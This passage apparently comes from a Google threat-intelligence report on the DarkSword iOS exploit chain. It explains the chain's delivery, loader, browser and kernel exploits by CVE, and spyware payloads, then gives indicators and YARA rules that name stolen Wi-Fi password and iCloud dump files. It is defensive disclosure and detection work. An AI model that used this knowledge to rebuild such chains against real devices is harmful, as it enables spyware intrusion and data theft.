+migFilterBypass = new MigFilterBypass(mutexPtr);
+}
+Figure 19: Code conditionally executed on iOS 18.4+ in GHOSTBLADE
+DarkSword Exploit Chain
+As mentioned, DarkSword uses six different vulnerabilities to fully compromise a vulnerable iOS device and run a final payload with full kernel privileges (Table 3). Unlike Coruna, DarkSword only supports a limited set of iOS versions (18.4-18.7), and while the different exploit stages are technically sophisticated, the mechanisms used for loading the exploits were more basic and less robust than Coruna.
+Also unlike Coruna, DarkSword uses pure JavaScript for all stages of the exploit chain and final payloads. While more sophistication is required to bridge between JavaScript and the native APIs and IPC channels used in the exploit, its use eliminates the need to identify vulnerabilities for bypassing [Page Protection Layer (PPL)](https://support.apple.com/guide/security/operating-system-integrity-sec8b776536b/1/web/1#sec314c3af61) or [Secure Page Table Monitor (SPTM)](https://support.apple.com/guide/security/operating-system-integrity-sec8b776536b/1/web/1#secd022396fb) exploit mitigations in iOS that prevent unsigned binary code from being executed.
+Figure 20: DarkSword infection chain
+Exploit Delivery
+There are notable similarities and differences between the exploit delivery implementations used by UNC6748, PARS Defense, and UNC6353. We assess that each of the actors built their delivery mechanisms on a base set of logic from the DarkSword developers, and made tweaks to fit their own needs. All three actors had some usage of the uid
+session storage key, but not all in the same way:
+-
+We consistently saw UNC6748 landing pages both set the
+uid
+key, and check it before fetching the exploit loader. -
+UNC6748 only set the
+top.location.href
+property to redirect users if they weren't to be infected. -
+PARS Defense used the
+uid
+key in the same way in January 2026, but the initial activity we saw in November 2025 didn't include it. -
+Like UNC6748, PARS Defense set
+top.location.href
+, but also setwindow.location.href
+to the same value. -
+UNC6353 set the
+uid
+key, but did not check it before fetching the exploit loader; a comment in the source code suggests that they did not know if it was required by the subsequent stages.
+Based on the actors' differing usages, we assess that this session storage check logic, along with the subsequent logic using frame.html
+to then fetch rce_loader.js
+as observed from UNC6748 and UNC6353, was developed by the DarkSword exploit chain developers. We assess that the additional fingerprinting logic used by PARS Defense in January 2026 and the anti-debug logic used by UNC6748 in November 2025 were likely written by those users to better meet their operational requirements.
+Loader
+All the activity we observed used effectively the same exploit loader, with some minor differences such as PARS Defense's addition of encryption. The loader manages Web Worker objects that are used by the two RCE exploits, along with state transitions throughout the RCE exploit lifecycle. The loader fetches two files for the RCE stages, named variations of rce_module.js
+and rce_worker.js
+(e.g. rce_worker_18.4.js
+). The iOS 18.4 exploit splits the logic between the Web Worker script and the main module, which is eval
+'d in the same context as the loader; the two different contexts communicate using postMessage
+as the RCE exploit progresses. The iOS 18.6/18.7 RCE exploit, however, contains all of the exploit logic in the worker, and the corresponding rce_module.js
+file just has an unused placeholder function (Figure 21).
+The inconsistencies surrounding the correctness of fetching the RCE stages by the loader module are intriguing. One possibility is that the errors were manually corrected by UNC6353 and PARS Defense; alternatively, it is possible that UNC6748 received the exploit chain updates prior to the other users, and the DarkSword developers subsequently fixed those bugs.
+// for displaying hex value
+function dummyy(x) {
+return '0x' + x.toString(16);
+}
+Figure 21: rce_module_18.7.js
+contents (UNC6748, November 2025)
+Remote Code Execution Exploits
+GTIG observed two different JavaScriptCore (the JavaScript engine used in WebKit and Apple's Safari browser) vulnerabilities exploited for remote code execution by DarkSword. For devices running versions of iOS prior to 18.6, DarkSword uses CVE-2025-31277, a JIT optimization/type confusion bug which was patched by Apple in iOS 18.6. For devices running iOS 18.6-18.7, DarkSword uses CVE-2025-43529, a garbage collection bug in the Data Flow Graph (DFG) JIT layer of JavaScriptCore which was patched by Apple in iOS 18.7.3 and 26.2 after it was reported by GTIG. Both exploits develop their own fakeobj
+/addrof
+primitives, and then build arbitrary read/write primitives the same way on top of them.
+Both vulnerabilities were directly chained with CVE-2026-20700, a bug in dyld
+used as a user-mode [Pointer Authentication Codes (PAC)](https://support.apple.com/guide/security/operating-system-integrity-sec8b776536b/1/web/1#sec0167b469d) bypass to execute arbitrary code, as required by the subsequent exploit stages. This vulnerability was patched by Apple in iOS 26.3 after being reported by GTIG.
+Sandbox Escape Exploits
+Safari is designed to use multiple sandbox layers to isolate the different components of the browser where untrusted user input may be handled. DarkSword uses two separate sandbox escape vulnerabilities, first by pivoting out of the WebContent sandbox into the GPU process, and then by pivoting from the GPU process to mediaplaybackd
+. The same sandbox escape exploits were used regardless of which RCE exploit was needed.
+WebContent Sandbox Escape
+As previously discussed by [Project Zero](https://projectzero.google/2023/10/an-analysis-of-an-in-the-wild-ios-safari-sandbox-escape.html) and others, Safari's renderer process (known as WebContent) is tightly sandboxed to limit the blast radius of any vulnerabilities it may contain, since it is the most accessible to untrusted user content. To bypass this, DarkSword fetches an exploit called sbox0_main_18.4.js
+or sbx0_main.js
+to break out of the WebContent sandbox. This exploit leverages CVE-2025-14174, a vulnerability in ANGLE where parameters were not sufficiently validated in a specific WebGL operation, leading to out-of-bounds memory operations in Safari's GPU process which the DarkSword developers use to execute arbitrary code within the GPU process.
+This vulnerability was reported to Google (the developers of ANGLE) by Apple and GTIG, and was patched in Safari with the release of iOS 18.7.3 and 26.2.
+GPU Sandbox Escape
+In Safari, the GPU process has more privileges than the WebContent sandbox, but still is restricted from accessing much of the rest of the system. To bypass this limitation, DarkSword uses another sandbox escape exploit, sbx1_main.js
+, which leverages CVE-2025-43510, a memory management vulnerability in XNU. This is a copy-on-write bug which is exploited to build arbitrary function call primitives in mediaplaybackd
+, a system service with a larger set of permissions than the Safari GPU process where they can run the final exploit needed. They do this by loading a copy of the JavaScriptCore runtime into the mediaplaybackd
+process, and executing the next stage exploit within it.
+This vulnerability was patched by Apple in iOS 18.7.2 and 26.1.
+Local Privilege Escalation and Final Payload
+Finally, the exploit loaded one last module, pe_main.js
+. This uses CVE-2025-43520, a kernel-mode race condition in XNU's virtual filesystem (VFS) implementation, which can be exploited to build physical and virtual memory read/write primitives. This vulnerability was patched by Apple in iOS 18.7.2 and 26.1.
+The exploit contains a suite of library classes building on top of their primitives that are used by the different post-exploitation payloads, such as Native
+, which provides abstractions for manipulating raw memory and calling native functions, and FileUtils
+, which provides a POSIX-like filesystem API. Artifacts left behind from the Webpack process applied to the analyzed GHOSTBLADE sample included file paths that show the structure on disk of these libraries (Figure 22).
+We assess that GHOSTBLADE was likely developed by the DarkSword developers, based on the consistency in coding styles and the tight integration between it and the library code, which is notably distinct from how GHOSTKNIFE and GHOSTSABER leveraged these libraries. We also observed additional modifications made to some of the post-exploitation payload libraries in the samples observed from PARS Defense, including additional raw memory buffer manipulation, likely used in follow-on binary modules. Additionally, the libraries in GHOSTBLADE contained a reference to a function called startSandworm()
+which was not implemented within it; we suspect this may be a codename for a different exploit.
+src/InjectJS.js
+src/libs/Chain/Chain.js
+src/libs/Chain/Native.js
+src/libs/Chain/OffsetsStruct.js
+src/libs/Driver/Driver.js
+src/libs/Driver/DriverNewThread.js
+src/libs/Driver/Offsets.js
+src/libs/Driver/OffsetsTable.js
+src/libs/JSUtils/FileUtils.js
+src/libs/JSUtils/Logger.js
+src/libs/JSUtils/Utils.js
+src/libs/TaskRop/Exception.js
+src/libs/TaskRop/ExceptionMessageStruct.js
+src/libs/TaskRop/ExceptionReplyStruct.js
+src/libs/TaskRop/MachMsgHeaderStruct.js
+src/libs/TaskRop/PAC.js
+src/libs/TaskRop/PortRightInserter.js
+src/libs/TaskRop/RegistersStruct.js
+src/libs/TaskRop/RemoteCall.js
+src/libs/TaskRop/Sandbox.js
+src/libs/TaskRop/SelfTaskStruct.js
+src/libs/TaskRop/Task.js
+src/libs/TaskRop/TaskRop.js
+src/libs/TaskRop/Thread.js
+src/libs/TaskRop/ThreadState.js
+src/libs/TaskRop/VM.js
+src/libs/TaskRop/VmMapEntry.js
+src/libs/TaskRop/VMObject.js
+src/libs/TaskRop/VmPackingParams.js
+src/libs/TaskRop/VMShmem.js
+src/loader.js
+src/main.js
+src/MigFilterBypassThread.js
+Figure 22: Filepath artifacts from GHOSTBLADE sample
+Outlook and Implications
+The use of both DarkSword and Coruna by a variety of actors demonstrates the ongoing risk of exploit proliferation across actors of varying geography and motivation. Google remains committed to aiding in the mitigation of this problem, in part through our ongoing participation in the [Pall Mall Process](https://www.gov.uk/government/publications/the-pall-mall-process-declaration-tackling-proliferation-and-irresponsible-use-of-commercial-cyber-intrusion-capabilities), designed to build consensus and progress toward limiting the harms from the spyware industry. Together, we are focused on developing international norms and frameworks to limit the misuse of these powerful technologies and protect human rights around the world. These efforts are built on earlier governmental actions, including [steps taken](https://www.federalregister.gov/documents/2023/03/30/2023-06730/prohibition-on-use-by-the-united-states-government-of-commercial-spyware-that-poses-risks-to) by the US Government to limit government use of spyware, and a [first-of-its-kind international](https://2021-2025.state.gov/joint-statement-on-efforts-to-counter-the-proliferation-and-misuse-of-commercial-spyware/) commitment to similar efforts.
+Acknowledgments
+We would like to acknowledge and thank Lookout, iVerify, [Google Project-Zero](http://projectzero.google/), and Apple Security Engineering & Architecture team for their partnership throughout this investigation.
+Indicators of Compromise (IOCs)
+To assist the wider community in hunting and identifying activity outlined in this blog post, we have included indicators of compromise (IOCs) in a [GTI Collection](https://www.virustotal.com/gui/collection/bd631d6c4cec1759bc298b8da180d9ed1d7d89475376bc614176c3541460f40c/summary) for registered users. We've also uploaded a sample of GHOSTBLADE to VirusTotal.
+Network Indicators
+File Indicators
+Detections
+YARA Rules
+rule G_Backdoor_GHOSTKNIFE_1 {
+meta:
+author = "Google Threat Intelligence Group (GTIG)"
+strings:
+$ = "server_pub_ex"
+$ = "client_pri_ds"
+$ = "getfilebyExtention"
+$ = "getContOfFilesForModule"
+$ = "carPlayConnectionState"
+$ = "saveRecordingApp"
+$ = "getLastItemBack"
+$ = "the inherted class"
+$ = "passExtetion"
+condition:
+filesize < 10MB and not (uint16be(0) == 0x504b or uint32be(0) == 0x6465780a or uint16be(0) == 0x4d5a or uint32be(0) == 0x377abcaf) and 4 of them
+}
+rule G_Backdoor_GHOSTSABER_1 {
+meta:
+author = "Google Threat Intelligence Group (GTIG)"
+strings:
+$ = "sendDeviceInfoJson"
+$ = "merge2AppLists"
+$ = "send_command_to_upper_process"
+$ = "ChangeStatusCheckSleepInterval"
+$ = "SendRegEx"
+$ = "evalJsResponse.json"
+$ = "sendSimpleUploadJsonObject"
+$ = "device_info_all"
+$ = "getPayloadForSimpleStatusRequest"
+condition:
+filesize < 10MB and not (uint16be(0) == 0x504b or uint32be(0) == 0x6465780a or uint16be(0) == 0x4d5a or uint32be(0) == 0x377abcaf) and 4 of them
+}
+rule G_Datamine_GHOSTBLADE_1 {
+meta:
+author = "Google Threat Intelligence Group (GTIG)"
+strings:
+$ = "/private/var/tmp/wifi_passwords.txt"
+$ = "/private/var/tmp/wifi_passwords_securityd.txt"
+$ = "/.com.apple.mobile_container_manager.metadata.plist" fullword
+$ = "X-Device-UUID: ${"
+$ = "/installed_apps.txt" fullword
+$ = "icloud_dump_" fullword
+condition:
+filesize < 10MB and not (uint16be(0) == 0x504b or uint32be(0) == 0x6465780a or uint16be(0) == 0x4d5a or uint32be(0) == 0x377abcaf) and 3 of them
+}
+rule G_Hunting_DarkSwordExploitChain_ImplantLib_FilePaths_1 {
+meta:
+author = "Google Threat Intelligence Group (GTIG)"
+strings:
+$ = "src/InjectJS.js"
+$ = "src/libs/Chain/Chain.js"
+$ = "src/libs/Chain/Native.js"
+$ = "src/libs/Chain/OffsetsStruct.js"
+$ = "src/libs/Driver/Driver.js"
+$ = "src/libs/Driver/DriverNewThread.js"
+$ = "src/libs/Driver/Offsets.js"
+$ = "src/libs/Driver/OffsetsTable.js"
+$ = "src/libs/JSUtils/FileUtils.js"
+$ = "src/libs/JSUtils/Logger.js"
+$ = "src/libs/JSUtils/Utils.js"
+$ = "src/libs/TaskRop/Exception.js"
+$ = "src/libs/TaskRop/ExceptionMessageStruct.js"
+$ = "src/libs/TaskRop/ExceptionReplyStruct.js"
+$ = "src/libs/TaskRop/MachMsgHeaderStruct.js"
+$ = "src/libs/TaskRop/PAC.js"
+$ = "src/libs/TaskRop/PortRightInserter.js"
+$ = "src/libs/TaskRop/RegistersStruct.js"
+$ = "src/libs/TaskRop/RemoteCall.js"
+$ = "src/libs/TaskRop/Sandbox.js"
+$ = "src/libs/TaskRop/SelfTaskStruct.js"
+$ = "src/libs/TaskRop/Task.js"
+$ = "src/libs/TaskRop/TaskRop.js"
+$ = "src/libs/TaskRop/Thread.js"
+$ = "src/libs/TaskRop/ThreadState.js"
+$ = "src/libs/TaskRop/VM.js"
+$ = "src/libs/TaskRop/VmMapEntry.js"
+$ = "src/libs/TaskRop/VMObject.js"
+$ = "src/libs/TaskRop/VmPackingParams.js"
+$ = "src/libs/TaskRop/VMShmem.js"
+$ = "src/MigFilterBypassThread.js"
+condition:
+any of them
+}</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
